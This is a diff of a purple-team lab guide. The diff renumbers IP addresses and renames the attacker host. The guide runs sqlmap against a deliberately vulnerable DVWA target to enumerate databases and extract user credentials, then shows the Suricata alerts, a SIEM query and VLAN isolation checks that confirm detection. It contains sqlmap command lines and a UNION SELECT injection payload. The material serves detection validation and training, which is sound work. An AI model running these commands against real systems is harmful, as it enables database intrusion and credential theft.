@@ -5,8 +5,8 @@ This document walks through a purple team exercise demonstrating the full detect
 ## Scenario
 
 **Objective:** Validate SQL injection detection capabilities  
-**Attack Platform:** sear (Kali) on VLAN 20 (10.10.20.20)  
-**Target:** DVWA on VLAN 40 (10.10.40.10)  
+**Attack Platform:** attack-01 (Kali) on VLAN 200 (172.20.2.12)  
+**Target:** DVWA on VLAN 400 (172.20.4.11)  
 **Expected:** Suricata alerts, full network flow capture, SIEM visibility
 
 ---
@@ -15,18 +15,18 @@ This document walks through a purple team exercise demonstrating the full detect
 
 ### Step 1: Prepare DVWA
 
-1. Access DVWA at http://10.10.40.10
+1. Access DVWA at http://172.20.4.11
 2. Login with default credentials (admin/password)
 3. Set Security Level to "Low" via DVWA Security menu
 4. Navigate to SQL Injection page
 
 ### Step 2: Launch SQLmap
 
-From sear (Kali):
+From attack-01 (Kali):
 
 ```bash
 # Basic SQL injection test
-sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://172.20.4.11/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=abc123;security=low" \
        --batch \
        --dbs
@@ -42,14 +42,14 @@ sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 ```bash
 # Dump database contents
-sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://172.20.4.11/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=abc123;security=low" \
        --batch \
        -D dvwa \
        --tables
 
 # Extract user credentials
-sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://172.20.4.11/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=abc123;security=low" \
        --batch \
        -D dvwa \
@@ -68,8 +68,8 @@ The following signatures triggered during the attack:
 ```json
 {
   "event_type": "alert",
-  "src_ip": "10.10.20.20",
-  "dest_ip": "10.10.40.10",
+  "src_ip": "172.20.2.12",
+  "dest_ip": "172.20.4.11",
   "alert": {
     "signature": "ET WEB_SERVER SQL Injection Attempt - UNION SELECT",
     "signature_id": 2006446,
@@ -107,8 +107,8 @@ GET fluentbit-default/_search
     "bool": {
       "must": [
         {"term": {"event_type": "alert"}},
-        {"term": {"src_ip": "10.10.20.20"}},
-        {"term": {"dest_ip": "10.10.40.10"}},
+        {"term": {"src_ip": "172.20.2.12"}},
+        {"term": {"dest_ip": "172.20.4.11"}},
         {"range": {"@timestamp": {"gte": "now-1h"}}}
       ]
     }
@@ -122,15 +122,15 @@ GET fluentbit-default/_search
 
 ## Isolation Verification
 
-**Critical Test:** Confirm VLAN 40 isolation prevented lateral movement.
+**Critical Test:** Confirm VLAN 400 isolation prevented lateral movement.
 
-From DVWA VM (10.10.40.10):
+From DVWA VM (172.20.4.11):
 
 ```bash
 # These should all fail
-ping 10.10.20.10    # QNAP - blocked
-ping 10.10.30.40    # DC01 - blocked
-ping 10.10.10.1     # Gateway - blocked
+ping 172.20.2.11    # QNAP - blocked
+ping 172.20.3.20    # DC01 - blocked
+ping 172.20.1.1     # Gateway - blocked
 ping 8.8.8.8        # Internet - blocked
 ```
 
@@ -145,8 +145,8 @@ ping 8.8.8.8        # Internet - blocked
 The SQLmap attack should appear as:
 - Spike in alert volume
 - Top signature: SQL Injection attempts
-- Source: 10.10.20.20 (sear)
-- Destination: 10.10.40.10 (DVWA)
+- Source: 172.20.2.12 (attack-01)
+- Destination: 172.20.4.11 (DVWA)
 
 ### Timeline View
 
@@ -172,9 +172,9 @@ The SQLmap attack should appear as:
 {
   "@timestamp": "2026-01-09T14:30:45.123Z",
   "event_type": "alert",
-  "src_ip": "10.10.20.20",
+  "src_ip": "172.20.2.12",
   "src_port": 45678,
-  "dest_ip": "10.10.40.10",
+  "dest_ip": "172.20.4.11",
   "dest_port": 80,
   "proto": "TCP",
   "alert": {
@@ -187,7 +187,7 @@ The SQLmap attack should appear as:
     "severity": 1
   },
   "http": {
-    "hostname": "10.10.40.10",
+    "hostname": "172.20.4.11",
     "url": "/vulnerabilities/sqli/?id=1' UNION SELECT null,null--&Submit=Submit",
     "http_method": "GET",
     "protocol": "HTTP/1.1",
